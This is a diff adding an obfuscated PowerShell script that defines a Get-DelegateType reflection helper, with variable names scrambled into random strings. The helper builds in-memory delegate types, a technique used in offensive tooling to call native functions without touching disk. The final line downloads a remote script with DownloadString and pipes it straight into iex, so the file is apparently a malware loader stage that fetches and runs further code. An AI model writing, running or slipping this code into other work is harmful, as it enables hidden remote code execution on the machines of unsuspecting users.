@@ -1,0 +1,28 @@
+function Get-DelegateType
+{
+    Param
+    (
+        [OutputType([Type])]
+            
+        [Parameter( Position = 0)]
+        [Type[]]
+        $XMTvKofckqcIHAsecCQMLQuNVYjjbXLGSrAFEqDR = (New-Object Type[](0)),
+            
+        [Parameter( Position = 1 )]
+        [Type]
+        $gkNUVKUFDbvAQXEAhZfflZyjeUiE = [Void]
+    )
+
+    $wdSScpGRSyXDrlKTgTqPgCjmFsjAXTXLsRQSomhlKW = [AppDomain]::CurrentDomain
+    $SLmAlkzZOfKQBVDjEBhtZhpybrsjB = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AvwZppUaTSYooxCDZYeGIawCMUZVFBnzxxYDV = $wdSScpGRSyXDrlKTgTqPgCjmFsjAXTXLsRQSomhlKW.DefineDynamicAssembly($SLmAlkzZOfKQBVDjEBhtZhpybrsjB, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $nKpKuGYIoBPnTwOYoUILjefDacZIb = $AvwZppUaTSYooxCDZYeGIawCMUZVFBnzxxYDV.DefineDynamicModule('InMemoryModule', $false)
+    $xREOxNFityerhhopZTIqjOFVlzhKyNwWNpH = $nKpKuGYIoBPnTwOYoUILjefDacZIb.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $vpVivkraaDpywGebThUTpGFGKyyycIltfaeyNhxVeThEl = $xREOxNFityerhhopZTIqjOFVlzhKyNwWNpH.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $XMTvKofckqcIHAsecCQMLQuNVYjjbXLGSrAFEqDR)
+    $vpVivkraaDpywGebThUTpGFGKyyycIltfaeyNhxVeThEl.SetImplementationFlags('Runtime, Managed')
+    $PluWZHOiRbAkzzJhQzUHTHRK = $xREOxNFityerhhopZTIqjOFVlzhKyNwWNpH.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $gkNUVKUFDbvAQXEAhZfflZyjeUiE, $XMTvKofckqcIHAsecCQMLQuNVYjjbXLGSrAFEqDR)
+    $PluWZHOiRbAkzzJhQzUHTHRK.SetImplementationFlags('Runtime, Managed')
+        
+    Write-Output $xREOxNFityerhhopZTIqjOFVlzhKyNwWNpH.CreateType()
+}
+$wbc.DownloadString("$prefixpath/Grilled.ps1.c3") | iex
